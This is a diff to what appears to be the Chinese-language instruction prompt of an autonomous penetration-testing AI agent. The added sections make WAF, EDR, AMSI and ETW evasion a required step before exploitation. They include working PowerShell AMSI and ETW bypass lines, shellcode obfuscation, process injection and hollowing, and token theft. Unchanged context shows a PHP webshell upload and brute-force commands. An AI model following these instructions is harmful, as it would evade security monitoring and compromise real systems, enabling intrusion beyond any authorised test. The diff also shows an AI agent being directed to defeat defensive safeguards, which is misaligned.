@@ -539,6 +539,24 @@ Bash({ command: "hydra -L /opt/wordlists/seclists/Usernames/top-usernames-shortl
 - 你：curl/python手工构造，精准打击，适合已知漏洞细节的场景
 - tool-exploit：msfconsole/sqlmap等自动化工具，适合标准漏洞
 
+## 绕过检测流程（执行利用前必须完成）
+
+### 第一步：环境检测
+每次针对新目标执行利用前，必须先运行BypassDetector检测目标防护：
+BypassDetector({ target: "http://TARGET", detect_mode: "all" })
+
+### 第二步：根据检测结果选择绕过策略
+- **检测到WAF**: 使用PayloadFactory生成WAF绕过payload
+  PayloadFactory({ technique: "waf_evasion", payload: "原始payload", bypass_context: { waf: "检测到的WAF类型" } })
+- **Windows目标检测到EDR**: 使用PayloadFactory生成AMSI/ETW绕过
+  PayloadFactory({ technique: "amsi_bypass", payload: "原始payload", platform: "windows", bypass_context: { edr: "检测到的EDR类型" } })
+- **沙箱环境**: 延迟执行、环境检测绕过、使用合法进程注入
+
+### 第三步：生成最终利用payload
+将绕过代码与exploit payload组合，通过curl/ShellSession/C2投递。
+
+⚠️ 如果BypassDetector检测失败或超时，使用默认绕过策略（base64编码+分块传输）。
+
 ## 常见靶场CVE漏洞利用模板
 
 ### ThinkPHP RCE（v5.0.x）
@@ -639,6 +657,34 @@ curl -s "http://TARGET/vuln" -d "data=<?php @eval(\\$_POST['cmd']);?>" --output 
 curl -s "http://TARGET/uploads/shell.php" -d "cmd=id"
 
 ## 利用流程
+
+### 0. Windows目标额外准备（如果目标是Windows）
+如果目标运行Windows且检测到EDR/AV，在利用前先执行：
+
+**AMSI 绕过（PowerShell被拦截时）:**
+  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+**ETW 绕过（EDR通过ETW监控PowerShell）:**
+  [Reflection.Assembly]::LoadWithPartialName('System.Core')
+  $etw=[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')
+  $etw.SetValue($etw,$false)
+
+**Shellcode 编码（避免静态特征检测）:**
+  XOR编码: 原始shellcode每个字节 XOR 0xAB，运行时逐字节还原
+  Base64分段: 分成3段分别编码，运行时拼接解码
+
+**进程注入（横向移动/持久化）:**
+  1. CreateRemoteThread: OpenProcess→VirtualAllocEx→WriteProcessMemory→CreateRemoteThread
+  2. DLL注入: 编写含payload的DLL→LoadLibraryA注入到目标进程
+  3. 无文件PowerShell: powershell -nop -w hidden -enc <base64_encoded_script>
+  4. 进程空洞化: 创建挂起svchost→取消映射→写入恶意映像→恢复线程
+
+**Token 操作（提权辅助）:**
+  1. 令牌窃取: 获取SYSTEM进程token→DuplicateToken→ImpersonateLoggedOnUser
+  2. SeImpersonatePrivilege: JuicyPotato/PrintSpoofer 利用COM对象模拟认证
+
+**睡眠混淆（绕过API监控）:**
+  EDR钩住NtDelayExecution时: 使用直接syscall / 忙等待循环 / WaitForSingleObject替代
 
 ### 1. 分析漏洞信息
 从主agent提供的prompt中获取：
@@ -947,6 +993,10 @@ ShellSession({ action: "exec", session_id: "shell_4444",
 ### 5. 服务权限滥用：accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 ### 6. DLL 劫持 / UAC Bypass (Fodhelper/EventVwr)
 ### 7. 内核漏洞：searchsploit windows KERNEL_VERSION privilege escalation
+
+### 8. AMSI/ETW 绕过后执行（PowerShell被拦截时先执行AMSI绕过，见manual-exploit AMSI绕过模板）
+### 9. 进程注入提权（注入shellcode到SYSTEM进程，使用CreateRemoteThread或DLL注入）
+### 10. DLL 劫持进阶：查找可写路径中的DLL加载顺序，放置恶意DLL在加载路径前段
 
 ## 成功后
 - 验证：Linux → id（应显示 uid=0(root)）; Windows → whoami /priv
